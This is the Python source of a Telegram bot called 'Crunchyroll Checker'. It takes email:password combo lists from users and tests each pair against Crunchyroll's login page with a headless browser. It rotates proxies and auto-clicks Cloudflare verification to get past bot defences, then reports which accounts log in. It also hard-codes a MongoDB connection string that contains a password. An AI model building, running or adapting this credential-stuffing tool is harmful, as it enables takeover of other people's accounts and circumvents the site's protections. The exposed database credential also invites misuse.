import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import logging
import asyncio
import random
from datetime import datetime, timezone
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from playwright.async_api import async_playwright
from motor.motor_asyncio import AsyncIOMotorClient

# ============ CONFIGURATION FROM ENV ============
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNELS = os.getenv("CHANNELS", "").split(",")
OWNER_ID = int(os.getenv("OWNER_ID", 0))
SUPPORT_LINK = os.getenv("SUPPORT_LINK", "https://t.me/yorichiiprime")
DAILY_LIMIT = int(os.getenv("DAILY_LIMIT", 50))
HEADLESS = True
GLOBAL_DELAY = 5
SUCCESS_IMAGE = "https://files.catbox.moe/ljc4hb.png"
START_IMAGE = "https://files.catbox.moe/vngb2d.png"

MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://yorichiiprimebusiness_db_user:DuLN8McOnlyGQyuc@grpmanegmentbot1rem.5sef7fp.mongodb.net/?appName=GRPMANEGMENTBOT1REM")
DB_NAME = os.getenv("DB_NAME", "crunchyroll_bot")

# ============ LOGGING ============
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============ HEALTH SERVER ============
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def start_health_server():
    port = int(os.getenv("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), HealthHandler)
    server.allow_reuse_address = True
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    logger.info(f"Health server running on port {port}")

# ============ MONGODB CLIENT ============
client = AsyncIOMotorClient(MONGODB_URI)
db = client[DB_NAME]
users_collection = db["users"]
usage_collection = db["usage"]

async def init_db():
    await users_collection.create_index("user_id", unique=True)
    await usage_collection.create_index([("user_id", 1), ("date", 1)], unique=True)

# ============ PROXY LOADING ============
def load_proxies():
    try:
        with open("proxies.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger.warning("proxies.txt not found – running without proxy")
        return []

PROXY_LIST = load_proxies()
logger.info(f"Loaded {len(PROXY_LIST)} proxies.")

# ============ CLOUDFLARE BYPASS ============
async def bypass_cloudflare(page, max_wait=60):
    start = asyncio.get_event_loop().time()
    while (asyncio.get_event_loop().time() - start) < max_wait:
        try:
            content = await page.content()
            url = page.url
            if "cloudflare" in content.lower() or "security verification" in content.lower():
                logger.info("🔍 Cloudflare detected – trying to auto‑click Verify...")
                try:
                    verify_btn = await page.wait_for_selector(
                        "button:has-text('Verify'), button:has-text('I am human'), button:has-text('Verify you are human')",
                        timeout=3000
                    )
                    if verify_btn:
                        await verify_btn.click()
                        await asyncio.sleep(3)
                except:
                    await asyncio.sleep(2)
                await asyncio.sleep(2)
                new_content = await page.content()
                new_url = page.url
                if ("cloudflare" not in new_content.lower() and 
                    "security verification" not in new_content.lower()) or \
                   ("www.crunchyroll.com/" in new_url and "login" not in new_url):
                    return True
            else:
                return True
        except:
            await asyncio.sleep(1)
    return False

# ============ USER FUNCTIONS ============
async def add_user(user_id):
    await users_collection.update_one(
        {"user_id": user_id},
        {"$setOnInsert": {"user_id": user_id, "joined_at": datetime.now(timezone.utc)}},
        upsert=True
    )

async def get_users():
    cursor = users_collection.find({}, {"user_id": 1})
    return [doc["user_id"] async for doc in cursor]

async def get_user_usage(user_id):
    today = datetime.now(timezone.utc).date().isoformat()
    doc = await usage_collection.find_one({"user_id": user_id, "date": today})
    if not doc:
        return {"user_id": user_id, "date": today, "count": 0}
    return doc

async def increment_usage(user_id):
    today = datetime.now(timezone.utc).date().isoformat()
    await usage_collection.update_one(
        {"user_id": user_id, "date": today},
        {"$inc": {"count": 1}},
        upsert=True
    )
    doc = await usage_collection.find_one({"user_id": user_id, "date": today})
    return doc["count"] if doc else 0

# ============ SUBSCRIPTION CHECK ============
async def is_subscribed(context, user_id):
    if not CHANNELS or CHANNELS == [""]:
        return True
    for channel in CHANNELS:
        channel = channel.strip()
        if not channel:
            continue
        try:
            member = await context.bot.get_chat_member(chat_id=f"@{channel}", user_id=user_id)
            if member.status in ["left", "kicked"]:
                return False
        except Exception as e:
            logger.warning(f"Could not check membership for @{channel}: {e}")
            continue
    return True

async def subscription_required(update, context):
    keyboard = []
    for channel in CHANNELS:
        ch = channel.strip()
        if ch:
            keyboard.append([InlineKeyboardButton(f"📢 Join @{ch}", url=f"https://t.me/{ch}")])
    keyboard.append([InlineKeyboardButton("✅ I've Joined – Verify", callback_data="verify_sub")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        "🔒 *Access Restricted*\n\n"
        "You must join our channels to use this bot.\n"
        "Please join all channels below, then click *Verify*."
    )
    await update.effective_message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")

# ============ MAIN MENU ============
def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔍 Check Account", callback_data="check")],
        [InlineKeyboardButton("📊 My Profile", callback_data="profile")],
        [InlineKeyboardButton("❓ Help", callback_data="help")],
        [InlineKeyboardButton("📞 Support", callback_data="support")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def send_main_menu(update, context, edit=False):
    user_id = update.effective_user.id
    if user_id == OWNER_ID:
        usage_text = "👑 Owner – Unlimited Checks!"
    else:
        usage = await get_user_usage(user_id)
        remaining = DAILY_LIMIT - usage["count"]
        usage_text = f"🔹 You have *{remaining}* checks left today."
    caption = (
        f"👋 *Welcome to Crunchyroll Checker!*\n\n"
        f"{usage_text}\n"
        f"🔹 Use /chk or upload a .txt file.\n"
        f"🔹 Need help? Use the buttons below."
    )
    if edit:
        await update.callback_query.edit_message_caption(
            caption=caption,
            reply_markup=main_menu_keyboard(),
            parse_mode="Markdown"
        )
        await update.callback_query.answer()
    else:
        await update.effective_message.reply_photo(
            photo=START_IMAGE,
            caption=caption,
            reply_markup=main_menu_keyboard(),
            parse_mode="Markdown"
        )

# ============ HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await add_user(user_id)
    if not await is_subscribed(context, user_id):
        await subscription_required(update, context)
        return
    await send_main_menu(update, context)

async def verify_sub(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    if await is_subscribed(context, user_id):
        await query.answer("✅ Verified! Welcome.")
        await send_main_menu(update, context)
    else:
        await query.answer("❌ You haven't joined all channels yet.", show_alert=True)
        await subscription_required(update, context)

async def main_menu_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id

    if not await is_subscribed(context, user_id):
        await query.answer("Please verify subscription first.")
        await subscription_required(update, context)
        return

    if data == "check":
        await query.answer()
        await query.edit_message_caption(
            caption="🔍 *How to Check Accounts*\n\n"
                    "Send `/chk email:password email2:password2`\n"
                    "or upload a `.txt` file with one `email:password` per line.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
            ]),
            parse_mode="Markdown"
        )
    elif data == "profile":
        if user_id == OWNER_ID:
            text = f"👑 *Owner Profile*\n\n"
            text += f"🆔 User ID: `{user_id}`\n"
            text += f"📅 Today's checks: *∞ Unlimited*\n"
            text += f"✅ Remaining: *∞ Unlimited*"
        else:
            usage = await get_user_usage(user_id)
            remaining = DAILY_LIMIT - usage["count"]
            text = f"📊 *Your Profile*\n\n"
            text += f"🆔 User ID: `{user_id}`\n"
            text += f"📅 Today's checks: *{usage['count']}* / {DAILY_LIMIT}\n"
            text += f"✅ Remaining: *{remaining}*\n"
            text += f"🔄 Resets at midnight UTC."
        await query.answer()
        await query.edit_message_caption(
            caption=text,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
            ]),
            parse_mode="Markdown"
        )
    elif data == "help":
        await query.answer()
        await query.edit_message_caption(
            caption="❓ *Help*\n\n"
                    "• `/start` – Show this menu\n"
                    "• `/chk email:pass` – Check one or more accounts\n"
                    "• Upload a `.txt` file with accounts\n"
                    "• `/usage` – Check remaining daily limit\n"
                    "• `/support` – Contact support",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
            ]),
            parse_mode="Markdown"
        )
    elif data == "support":
        await query.answer()
        await query.edit_message_caption(
            caption=f"📞 *Support*\n\nContact our support team:\n[Click here]({SUPPORT_LINK})",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📩 Contact Support", url=SUPPORT_LINK)],
                [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
            ]),
            parse_mode="Markdown"
        )
    elif data == "back_main":
        await query.answer()
        await send_main_menu(update, context, edit=True)

# ============ GLOBAL LOCK FOR SEQUENTIAL LOGIN ============
_login_lock = asyncio.Lock()

# ============ ULTRA-FAST LOGIN FUNCTION (LOW MEMORY) ============
async def login_crunchyroll(email: str, password: str) -> dict:
    result = {"success": False, "screenshot": None, "message": ""}
    proxy_str = random.choice(PROXY_LIST) if PROXY_LIST else None
    proxy = {"server": proxy_str} if proxy_str else None

    async with async_playwright() as p:
        # Launch with low‑memory arguments
        browser = await p.chromium.launch(
            headless=HEADLESS,
            args=[
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process',
                '--disable-accelerated-2d-canvas',
                '--disable-accelerated-video-decode',
            ],
            proxy=proxy
        )
        context = await browser.new_context(
            viewport={"width": 800, "height": 600},  # smaller viewport
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            storage_state=None
        )
        page = await context.new_page()

        try:
            sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
            await page.goto(sso_url, timeout=15000)
            await page.wait_for_selector("input[name='email'], input[type='email']", timeout=5000)

            if not await bypass_cloudflare(page):
                result["message"] = "⏱️ Cloudflare timed out."
                result["screenshot"] = await page.screenshot()
                return result

            for sel in ["#onetrust-accept-btn-handler", "button:has-text('Accept All')"]:
                try:
                    btn = await page.wait_for_selector(sel, timeout=2000)
                    if btn:
                        await btn.click()
                        break
                except:
                    pass

            email_field = await page.wait_for_selector("input[name='email'], input[type='email']", timeout=4000)
            await email_field.fill(email)
            await asyncio.sleep(0.1)

            password_field = await page.wait_for_selector("input[type='password']", timeout=4000)
            await password_field.fill(password)
            await asyncio.sleep(0.1)

            submit_btn = await page.wait_for_selector("button[type='submit'], button:has-text('LOGIN')", timeout=4000)
            await submit_btn.click()

            await asyncio.sleep(0.5)

            start_time = asyncio.get_event_loop().time()
            timeout_sec = 20

            while (asyncio.get_event_loop().time() - start_time) < timeout_sec:
                url = page.url
                content = await page.content()

                if "www.crunchyroll.com/" in url and "login" not in url and "verifying" not in content.lower():
                    result["success"] = True
                    result["message"] = "✅ Login Successful!"
                    break

                if "incorrect" in content.lower() or "wrong" in content.lower():
                    result["message"] = "❌ Wrong email or password"
                    break

                if "verifying" in content.lower():
                    await asyncio.sleep(0.5)
                    continue

                if "login" in url and "callback" not in url:
                    result["message"] = "❌ Login failed – still on login page."
                    break

                await asyncio.sleep(0.5)

            if not result["message"]:
                content = await page.content()
                url = page.url
                if "www.crunchyroll.com/" in url and "login" not in url and "verifying" not in content.lower():
                    result["success"] = True
                    result["message"] = "✅ Login Successful!"
                else:
                    result["message"] = "❌ Login failed – timeout."

            result["screenshot"] = await page.screenshot()

        except Exception as e:
            logger.error(f"Login error for {email}: {e}")
            result["message"] = f"❌ Error: {str(e)[:150]}"
            try:
                result["screenshot"] = await page.screenshot()
            except:
                pass
        finally:
            await context.close()
            await browser.close()
    return result

# ============ COMMANDS ============
async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_subscribed(context, user_id):
        await subscription_required(update, context)
        return

    args = context.args
    if not args:
        await update.message.reply_text("❌ Please provide email:password pairs.")
        return

    accounts = []
    i = 0
    while i < len(args):
        arg = args[i]
        if ':' in arg:
            parts = arg.split(':', 1)
            if '@' in parts[0]:
                accounts.append((parts[0].strip(), parts[1].strip()))
                i += 1
            else:
                i += 1
        elif '@' in arg and i+1 < len(args):
            accounts.append((arg.strip(), args[i+1].strip()))
            i += 2
        else:
            i += 1

    if not accounts:
        await update.message.reply_text("❌ No valid accounts found.")
        return

    # Check daily limit for non‑owners
    if user_id != OWNER_ID:
        usage = await get_user_usage(user_id)
        remaining = DAILY_LIMIT - usage["count"]
        if remaining <= 0:
            await update.message.reply_text("⛔ Daily limit reached. Please wait until midnight UTC.")
            return
        if len(accounts) > remaining:
            accounts = accounts[:remaining]

    # Send a single status message that we'll edit later
    status_msg = await update.message.reply_text(f"🔄 Checking {len(accounts)} account(s)...")

    results = []
    # Process accounts sequentially with global lock to avoid memory spikes
    for idx, (email, password) in enumerate(accounts, 1):
        await status_msg.edit_text(f"🔄 Processing {idx}/{len(accounts)}: `{email}` ...")

        # Acquire global lock – only one login at a time
        async with _login_lock:
            result = await login_crunchyroll(email, password)

        # Count usage only for non‑owners
        if user_id != OWNER_ID:
            new_count = await increment_usage(user_id)
            used_text = f"{new_count}/{DAILY_LIMIT}"
        else:
            used_text = "∞ Unlimited"

        # Build ASCII box
        if result["success"]:
            box = (
                "╭──── success ────╮\n"
                "  user authenticated ✌️\n"
                "  successfully 🌀\n"
                "╰─────────────╯"
            )
            caption = f"{box}\n\n`{email}` (Used {used_text} today)"
            await update.message.reply_photo(photo=SUCCESS_IMAGE, caption=caption)
        else:
            box = (
                "╭──────── failed ────────╮\n"
                "   ✗ authentication failed ⚠️\n"
                "   access denied 🚫\n"
                "╰────────────────────╯"
            )
            if result["screenshot"]:
                caption = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
                await update.message.reply_photo(photo=result["screenshot"], caption=caption)
            else:
                text = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
                await update.message.reply_text(text)

        # Delay between checks to avoid rate limits
        if idx < len(accounts):
            await asyncio.sleep(GLOBAL_DELAY)

    await status_msg.edit_text(f"✅ Finished checking {len(accounts)} account(s).")

async def cmd_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == OWNER_ID:
        await update.message.reply_text(
            f"👑 *Owner – Unlimited Checks!*\n"
            f"You have no daily limit.\n"
            f"Enjoy unlimited usage! 🚀",
            parse_mode="Markdown"
        )
    else:
        usage = await get_user_usage(user_id)
        remaining = DAILY_LIMIT - usage["count"]
        await update.message.reply_text(
            f"📊 *Your Usage*\n"
            f"Used: *{usage['count']}* / {DAILY_LIMIT}\n"
            f"Remaining: *{remaining}*\n"
            f"Resets at 00:00 UTC",
            parse_mode="Markdown"
        )

async def cmd_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"📞 Contact support: [Click here]({SUPPORT_LINK})", parse_mode="Markdown")

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if not context.args and not update.message.reply_to_message:
        await update.message.reply_text("Usage: /bcast <message> or reply to a message.")
        return

    text = " ".join(context.args) if context.args else None
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text
        if not text:
            await update.message.reply_text("Please reply to a text message.")
            return

    users = await get_users()
    if not users:
        await update.message.reply_text("No users registered yet.")
        return

    sent = 0
    failed = 0
    for uid in users:
        try:
            await context.bot.send_message(chat_id=uid, text=f"📢 *Broadcast*\n\n{text}", parse_mode="Markdown")
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)

    await update.message.reply_text(f"✅ Broadcast sent:\nSent: {sent}\nFailed: {failed}")

# ============ FILE HANDLER ============
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await is_subscribed(context, user_id):
        await subscription_required(update, context)
        return

    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a .txt file.")
        return

    file = await context.bot.get_file(doc.file_id)
    content = await file.download_as_bytearray()
    lines = content.decode('utf-8').splitlines()
    accounts = []
    for line in lines:
        line = line.strip()
        if ':' in line:
            email, password = line.split(':', 1)
            if '@' in email and password:
                accounts.append((email.strip(), password.strip()))

    if not accounts:
        await update.message.reply_text("❌ No valid `email:password` lines.")
        return

    # Check daily limit for non‑owners
    if user_id != OWNER_ID:
        usage = await get_user_usage(user_id)
        remaining = DAILY_LIMIT - usage["count"]
        if remaining <= 0:
            await update.message.reply_text("⛔ Daily limit reached.")
            return
        if len(accounts) > remaining:
            accounts = accounts[:remaining]

    status_msg = await update.message.reply_text(f"📄 Processing {len(accounts)} accounts from file...")

    for idx, (email, password) in enumerate(accounts, 1):
        await status_msg.edit_text(f"🔄 Processing {idx}/{len(accounts)}: `{email}` ...")

        async with _login_lock:
            result = await login_crunchyroll(email, password)

        if user_id != OWNER_ID:
            new_count = await increment_usage(user_id)
            used_text = f"{new_count}/{DAILY_LIMIT}"
        else:
            used_text = "∞ Unlimited"

        if result["success"]:
            box = (
                "╭──── success ────╮\n"
                "  user authenticated ✌️\n"
                "  successfully 🌀\n"
                "╰─────────────╯"
            )
            caption = f"{box}\n\n`{email}` (Used {used_text} today)"
            await update.message.reply_photo(photo=SUCCESS_IMAGE, caption=caption)
        else:
            box = (
                "╭──────── failed ────────╮\n"
                "   ✗ authentication failed ⚠️\n"
                "   access denied 🚫\n"
                "╰────────────────────╯"
            )
            if result["screenshot"]:
                caption = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
                await update.message.reply_photo(photo=result["screenshot"], caption=caption)
            else:
                text = f"{box}\n\n`{email}` – {result['message']} (Used {used_text} today)"
                await update.message.reply_text(text)

        if idx < len(accounts):
            await asyncio.sleep(GLOBAL_DELAY)

    await status_msg.edit_text(f"✅ Finished checking {len(accounts)} accounts from file.")

# ============ MAIN ============
def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set. Exiting.")
        return

    start_health_server()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(init_db())
    logger.info("MongoDB initialized.")

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("usage", cmd_usage))
    app.add_handler(CommandHandler("support", cmd_support))
    app.add_handler(CommandHandler("bcast", cmd_broadcast))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(verify_sub, pattern="^verify_sub$"))
    app.add_handler(CallbackQueryHandler(main_menu_button, pattern="^(check|profile|help|support|back_main)$"))

    print("🤖 Bot started. Waiting for commands...")
    app.run_polling()

if __name__ == "__main__":
    main()